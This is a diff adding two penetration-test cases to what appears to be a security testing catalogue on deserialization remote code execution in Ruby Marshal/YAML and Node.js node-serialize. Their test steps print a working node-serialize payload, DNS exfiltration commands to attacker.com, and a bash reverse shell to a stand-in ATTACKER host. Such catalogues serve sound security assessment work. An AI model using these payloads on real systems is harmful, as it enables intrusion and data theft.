@@ -169,3 +169,30 @@
 | **Expected Result** | Complete classpath map of available exploitable classes; at least one viable gadget chain identified; custom payload generated and verified for target-specific library combination |
 | **Verification** | 1. GadgetProbe identifies 3+ exploitable classes in target classpath<br>2. At least one standard ysoserial/phpggc chain successfully tested<br>3. Custom chain documented with source class, sink class, and intermediate gadgets<br>4. Payload reliability verified across 3+ repeated attempts |
 | **Remediation** | Remove unnecessary libraries from classpath to reduce gadget chain surface; upgrade all libraries to patched versions that break known chains; implement `ObjectInputFilter` (Java 9+) with strict class whitelist; deploy Java Security Manager with minimal permissions; use serialization proxy pattern for sensitive classes; conduct regular dependency auditing with OWASP Dependency-Check |
+
+---
+
+### TC-DESER-009: Ruby Deserialization RCE via Universal Gadget Chain
+
+| Field | Value |
+|------|------|
+| **ID** | TC-DESER-009 |
+| **Name** | Ruby Deserialization RCE via Universal Gadget Chain |
+| **Category** | D. Ruby / Node.js |
+| **Severity** | CRITICAL |
+| **Prerequisites** | Target is a Ruby web application (Rails/Sinatra) accepting Marshal-serialized data (Base64 of `\x04\x08` magic), or YAML.load on user input with a known gadget gem present (e.g., active_support, devise) |
+| **Test Steps** | 1. Detect Marshal magic bytes `\x04\x08` in cookies/params (Base64 often starts with `BAhv`)<br>2. Fingerprint loaded gems via error pages or `/rails/info` exposure<br>3. Build a universal Ruby gadget payload with a `Gem::Requirement` chain and base64-encode the output<br>4. Replace the serialized cookie/parameter with the payload<br>5. Confirm execution via DNS callback: payload command `nslookup $(id -u).attacker.com` |
+| **Expected Results** | DNS callback confirms arbitrary Ruby code execution through the Marshal gadget chain |
+
+### TC-DESER-010: Node.js node-serialize Deserialization RCE
+
+| Field | Value |
+|------|------|
+| **ID** | TC-DESER-010 |
+| **Name** | Node.js node-serialize Deserialization RCE |
+| **Category** | D. Ruby / Node.js |
+| **Severity** | CRITICAL |
+| **Prerequisites** | Target Node.js application passes user input to `node-serialize`'s `unserialize()` (identified via JavaScript error stack traces or source disclosure) |
+| **Test Steps** | 1. Craft payload embedding the IIFE marker: `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('nslookup $(whoami).attacker.com');}()"}`<br>2. Serialize the object with the node-serialize format and submit via the identified input<br>3. On success, replace the command with a reverse shell one-liner (`require('child_process').exec('bash -i >& /dev/tcp/ATTACKER/4444 0>&1')`)<br>4. Catch the shell on a prepared listener |
+| **Expected Results** | Callback/shell confirms arbitrary JavaScript execution in the Node.js process context |
+
